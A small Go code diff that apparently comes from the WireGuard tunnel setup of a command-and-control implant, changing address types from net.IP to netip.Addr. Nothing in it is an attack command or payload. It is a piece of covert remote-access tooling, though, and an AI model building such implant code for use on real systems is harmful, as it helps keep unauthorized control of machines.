@@ -29,6 +29,7 @@ import (
 	"fmt"
 	"io"
 	"net"
+	"net/netip"
 	"strconv"
 	"strings"
 	"time"
@@ -215,8 +216,8 @@ func WGConnect(address string, port uint16) (net.Conn, *device.Device, error) {
 // then creates a Wireguard device/interface and applies configuration
 func bringUpWGInterface(address string, port uint16, implantPrivKey string, serverPubKey string, netstackTunIP string) (tun.Device, *device.Device, *netstack.Net, error) {
 	tun, tNet, err := netstack.CreateNetTUN(
-		[]net.IP{net.ParseIP(netstackTunIP)},
-		[]net.IP{net.ParseIP("127.0.0.1")}, // We don't use DNS in the WG implant. Yet.
+		[]netip.Addr{netip.MustParseAddr(netstackTunIP)},
+		[]netip.Addr{netip.MustParseAddr("127.0.0.1")}, // We don't use DNS in the WG implant. Yet.
 		1420)
 	if err != nil {
 		// {{if .Config.Debug}}
